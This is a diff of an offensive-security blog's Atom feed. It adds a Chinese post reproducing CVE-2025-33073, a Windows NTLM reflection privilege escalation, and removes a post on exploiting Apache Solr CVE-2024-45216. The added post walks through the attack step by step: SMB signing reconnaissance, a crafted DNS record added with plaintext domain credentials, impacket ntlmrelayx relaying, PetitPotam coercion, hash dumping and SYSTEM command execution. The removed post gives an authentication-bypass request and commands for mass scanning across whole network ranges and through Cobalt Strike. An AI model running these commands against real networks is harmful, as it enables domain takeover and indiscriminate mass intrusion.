@@ -6,7 +6,7 @@
   <link href="http://k8gege.org/atom.xml" rel="self"/>
   
   <link href="http://k8gege.org/"/>
-  <updated>2025-08-01T14:42:29.995Z</updated>
+  <updated>2025-10-06T03:02:06.228Z</updated>
   <id>http://k8gege.org/</id>
   
   <author>
@@ -15,6 +15,35 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CVE-2025-33073 域内提权NTLM反射漏洞复现</title>
+    <link href="http://k8gege.org/p/cve-2025-33073.html"/>
+    <id>http://k8gege.org/p/cve-2025-33073.html</id>
+    <published>2025-09-28T12:40:00.000Z</published>
+    <updated>2025-10-06T03:02:06.228Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="漏洞概述">漏洞概述</h3><p>Windows SMB 客户端中发现一项严重漏洞（CVE-2025-33073），允许普通域用户在未启用服务器端 SMB 签名的情况下，借助恶意 SMB 服务器进行权限提升，最终获得本地 SYSTEM 级别权限。攻击流程如下：</p><pre><code>攻击者诱使受害机向其恶意 SMB 服务器发起连接。恶意服务器在 Kerberos 认证阶段注入特制子密钥，并将伪造的 AP-REQ 票据中继回受害主机。SMB 客户端误信该票据，将凭证提升为 SYSTEM 令牌。攻击者借助该高权限令牌，可在目标机器上执行任意代码。</code></pre><p>该漏洞影响所有未强制要求 SMB 签名的已加入域的 Windows 版本（除域控制器外），包括 Windows 10/11（直到 23H2）和 Windows Server 2008—2025 等。微软已于 2025 年 6 月 10 日的补丁星期二中发布修复补丁。</p><h3 id="SMB协议NTLM信息探测windows系统信息">SMB协议NTLM信息探测windows系统信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon.exe np 192.168.1.1/24 smbinfo</span><br></pre></td></tr></table></figure><p>结果如下  目标机器win10未启用SMB签名</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">SMB: 192.168.1.14      WIN10           (Win10-Enterprise-2016-LTSB-14393 10.0.14393 Win 10/Win 2016, 1607) Domain:K8GEGE Dns:k8gege.org SMBSigning:False</span><br><span class="line">SMB: 192.168.1.18      WIN2008         (Win2008-R2-Enterprise-7601-SP1 6.1.7601 ) Domain:K8GEGE Dns:k8gege.org SMBSigning:False</span><br><span class="line">SMB: 192.168.1.142     2016            (Win2016-Datacenter 10.0.14393) Domain:K8GEGE Dns:k8gege.org SMBSigning:True</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/k8img/posts/CVE-2025-33073/win10_smbfalse.png" alt="使用http访问查看图片"></p><h3 id="添加DNS记录">添加DNS记录</h3><p>由机器名 或 localhost 加 1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA 组成</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dnstool.py -u k8gege\\win10 -p k8gege520? -r win101UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d 192.168.1.100 --action add 192.168.1.142</span><br></pre></td></tr></table></figure><p><img src="/k8img/posts/CVE-2025-33073/win10_dnsadd.png" alt="使用http访问查看图片"></p><h3 id="启动监听">启动监听</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">impacket-ntlmrelayx -t 192.168.1.14 -smb2support -ts -c <span class="built_in">whoami</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[2025-10-05 22:38:13] [*] Protocol Client DCSYNC loaded..</span><br><span class="line">[2025-10-05 22:38:13] [*] Protocol Client IMAPS loaded..</span><br><span class="line">[2025-10-05 22:38:13] [*] Protocol Client IMAP loaded..</span><br><span class="line">[2025-10-05 22:38:13] [*] Protocol Client MSSQL loaded..</span><br><span class="line">[2025-10-05 22:38:13] [*] Protocol Client SMTP loaded..</span><br><span class="line">[2025-10-05 22:38:13] [*] Protocol Client HTTPS loaded..</span><br><span class="line">[2025-10-05 22:38:13] [*] Protocol Client HTTP loaded..</span><br><span class="line">[2025-10-05 22:38:13] [*] Protocol Client SMB loaded..</span><br><span class="line">[2025-10-05 22:38:13] [*] Protocol Client RPC loaded..</span><br><span class="line">[2025-10-05 22:38:14] [*] Protocol Client LDAP loaded..</span><br><span class="line">[2025-10-05 22:38:14] [*] Protocol Client LDAPS loaded..</span><br><span class="line">[2025-10-05 22:38:15] [*] Running <span class="keyword">in</span> relay mode to single host</span><br><span class="line">[2025-10-05 22:38:15] [*] Setting up SMB Server on port 445</span><br><span class="line">[2025-10-05 22:38:15] [*] Setting up HTTP Server on port 80</span><br><span class="line">[2025-10-05 22:38:15] [*] Setting up WCF Server on port 9389</span><br><span class="line">[2025-10-05 22:38:15] [*] Setting up RAW Server on port 6666</span><br><span class="line">[2025-10-05 22:38:15] [*] Multirelay disabled</span><br><span class="line"></span><br><span class="line">[2025-10-05 22:38:15] [*] Servers started, waiting <span class="keyword">for</span> connections</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="强制NTLM认证">强制NTLM认证</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 PetitPotam.py -d k8gege.org -u win10 -p k8gege520? win101UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA 192.168.1.14</span><br></pre></td></tr></table></figure><p><img src="/k8img/posts/CVE-2025-33073/win10_petit.png" alt="使用http访问查看图片"></p><h3 id="DumpHash">DumpHash</h3><p><img src="/k8img/posts/CVE-2025-33073/win10_dumphash.png" alt="使用http访问查看图片"></p><h3 id="执行命令">执行命令</h3><p><img src="/k8img/posts/CVE-2025-33073/win10_whoami.png" alt="使用http访问查看图片"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h3 id=&quot;漏洞概述&quot;&gt;漏洞概述&lt;/h3&gt;
+&lt;p&gt;Windows SMB 客户端中发现一项严重漏洞（CVE-2025-33073），允许普通域用户在未启用服务器端 SMB 签名的情况下，借助恶意 SMB 服务器进行权限提升，最终获得本地 SYSTEM 级别权限。攻击流程如下：</summary>
+      
+    
+    
+    
+    <category term="EXP" scheme="http://k8gege.org/categories/EXP/"/>
+    
+    
+    <category term="SMB" scheme="http://k8gege.org/tags/SMB/"/>
+    
+    <category term="NTLM" scheme="http://k8gege.org/tags/NTLM/"/>
+    
+    <category term="CVE-2025-33073" scheme="http://k8gege.org/tags/CVE-2025-33073/"/>
+    
+  </entry>
   
   <entry>
     <title>Ladon SharePoint CVE-2025-53770漏洞后门批量检测</title>
@@ -87,9 +116,9 @@
     
     
     
-    <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
-    
     <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
     
     <category term="Rce" scheme="http://k8gege.org/categories/Rce/"/>
     
@@ -119,9 +148,9 @@
     
     
     
-    <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
-    
     <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
     
     <category term="远程执行" scheme="http://k8gege.org/categories/Rce/"/>
     
@@ -156,9 +185,9 @@ Visit &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;
     
     
     
-    <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
-    
     <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
     
     
     <category term="DeepSeek" scheme="http://k8gege.org/tags/DeepSeek/"/>
@@ -191,9 +220,9 @@ Visit &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;
     
     
     
-    <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
-    
     <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
     
     
     <category term="Exp" scheme="http://k8gege.org/tags/Exp/"/>
@@ -226,43 +255,14 @@ Visit &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;
     
     
     
-    <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
-    
     <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
     
     
     <category term="CVE-2024-47575" scheme="http://k8gege.org/tags/CVE-2024-47575/"/>
     
     <category term="FortiManager" scheme="http://k8gege.org/tags/FortiManager/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>LadonExp CVE-2024-45216 漏洞复现批量扫描教程</title>
-    <link href="http://k8gege.org/p/CVE-2024-45216.html"/>
-    <id>http://k8gege.org/p/CVE-2024-45216.html</id>
-    <published>2024-11-01T15:40:00.000Z</published>
-    <updated>2025-04-18T15:24:44.676Z</updated>
-    
-    <content type="html"><![CDATA[<h1>Ladon CVE-2024-45216 影响版本 Apache Solr 5.3.0 &lt;= Apache Solr &lt; 8.11.4  9.0.0 &lt;= Apache Solr &lt; 9.7.0</h1><p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/CVE-2024-45216.html";</script><p>LadonEXP一键生成Poc/Exp，批量漏洞挖掘，快速获取权限。使用Ladon可对C段、B段、A段、全网批量扫描，0day/1day/Nday快速利用。</p><h3 id="免责声明">免责声明</h3><p>Ladon项目所涉及的技术、思路和工具仅供学习或授权渗透，非法用途后果自负。</p><h3 id="漏洞编号">漏洞编号</h3><p>CVE-2024-45216</p><h3 id="影响版本">影响版本</h3><p>Apache Solr 5.3.0 &lt;= Apache Solr &lt; 8.11.4  9.0.0 &lt;= Apache Solr &lt; 9.7.0</p><h3 id="应用指纹">应用指纹</h3><p>app=“Apache Solr”</p><h3 id="漏洞简介">漏洞简介</h3><p>Apache Solr 5.3.0至8.11.4之前版本和9.0.0至9.7.0之前版本存在安全漏洞，该漏洞源于存在身份验证不当漏洞，从而可使用虚假URL路径结尾绕过身份验证。</p><h3 id="Payload">Payload</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /solr/admin/info/properties:/admin/info/key</span><br><span class="line">Host: 192.168.1.8</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>PS: 使用LadonExp填上对应内容，即可生成POC/EXP</p><h3 id="POC独立使用">POC独立使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2024-45216.exe http://192.168.1.8</span><br></pre></td></tr></table></figure><p>PS: 部分https站点需Ladon调用扫描</p><p><img src="/k8img/Ladon/exp/CVE-2024-45216/poc.png" alt="使用http访问查看图片"></p><h3 id="EXP执行命令">EXP执行命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2024-45216.exe http://192.168.1.8 <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><p>PS: 将payload中的cmd命令如whoami替换成$cmd$ 即可生成EXP</p><h3 id="CS使用POC">CS使用POC</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; execute-assembly C:\Ladon\CVE-2024-45216.exe http://192.168.1.8</span><br></pre></td></tr></table></figure><p>PS: Cobalt Strike内存加载CVE-2024-45216.exe</p><h3 id="指定URL">指定URL</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon http://192.168.1.8 CVE-2024-45216.exe</span><br><span class="line">Ladon http://192.168.1.8 CVE-2024-45216.dll</span><br></pre></td></tr></table></figure><h3 id="指定IP">指定IP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8 CVE-2024-45216.exe</span><br><span class="line">Ladon 192.168.1.8 CVE-2024-45216.dll</span><br></pre></td></tr></table></figure><h3 id="批量URL">批量URL</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon url.txt CVE-2024-45216.exe</span><br></pre></td></tr></table></figure><p>PS：TXT可存放IP、IP:Port、URL等格式</p><p><img src="/k8img/Ladon/exp/CVE-2024-45216/vul.png" alt="使用http访问查看图片"></p><h3 id="批量IP">批量IP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip.txt CVE-2024-45216.exe</span><br><span class="line">Ladon noping ip.txt CVE-2024-45216.exe</span><br></pre></td></tr></table></figure><h3 id="指定C段">指定C段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 CVE-2024-45216.exe</span><br><span class="line">Ladon noping 192.168.1.8/24 CVE-2024-45216.exe</span><br><span class="line"></span><br><span class="line">Ladon 192.168.1.8/24 CVE-2024-45216.dll</span><br><span class="line">Ladon noping 192.168.1.8/24 CVE-2024-45216.dll</span><br></pre></td></tr></table></figure><h3 id="指定B段">指定B段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/b CVE-2024-45216.exe</span><br><span class="line">Ladon noping 192.168.1.8/b CVE-2024-45216.exe</span><br><span class="line"></span><br><span class="line">Ladon 192.168.1.8/b CVE-2024-45216.dll</span><br><span class="line">Ladon noping 192.168.1.8/b CVE-2024-45216.dll</span><br></pre></td></tr></table></figure><h3 id="指定A段">指定A段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/a CVE-2024-45216.exe</span><br><span class="line">Ladon noping 192.168.1.8/a CVE-2024-45216.exe</span><br><span class="line"></span><br><span class="line">Ladon 192.168.1.8/a CVE-2024-45216.dll</span><br><span class="line">Ladon noping 192.168.1.8/a CVE-2024-45216.dll</span><br></pre></td></tr></table></figure><h3 id="批量C段">批量C段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip24.txt CVE-2024-45216.exe</span><br><span class="line">Ladon ipc.txt CVE-2024-45216.exe</span><br><span class="line"></span><br><span class="line">Ladon noping ip24.txt CVE-2024-45216.exe</span><br><span class="line">Ladon noping ipc.txt CVE-2024-45216.exe</span><br></pre></td></tr></table></figure><p>PS: TXT存放多个目标的C段IP</p><h3 id="批量B段">批量B段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip16.txt CVE-2024-45216.exe</span><br><span class="line">Ladon noping ip16.txt CVE-2024-45216.exe</span><br></pre></td></tr></table></figure><p>PS: TXT存放多个目标的B段IP</p><h3 id="批量网段">批量网段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon cidr.txt CVE-2024-45216.exe</span><br><span class="line">Ladon noping cidr.txt CVE-2024-45216.exe</span><br></pre></td></tr></table></figure><p>PS: TXT存放各种IP网段，全网无差别扫描</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1&gt;Ladon CVE-2024-45216 影响版本 Apache Solr 5.3.0 &amp;lt;= Apache Solr &amp;lt; 8.11.4  9.0.0 &amp;lt;= Apache Solr &amp;lt; 9.7.0&lt;/h1&gt;
-&lt;p&gt;++++++++++++++++++</summary>
-      
-    
-    
-    
-    <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
-    
-    <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
-    
-    
-    <category term="Apache Solr" scheme="http://k8gege.org/tags/Apache-Solr/"/>
-    
-    <category term="CVE-2024-45216" scheme="http://k8gege.org/tags/CVE-2024-45216/"/>
     
   </entry>
   
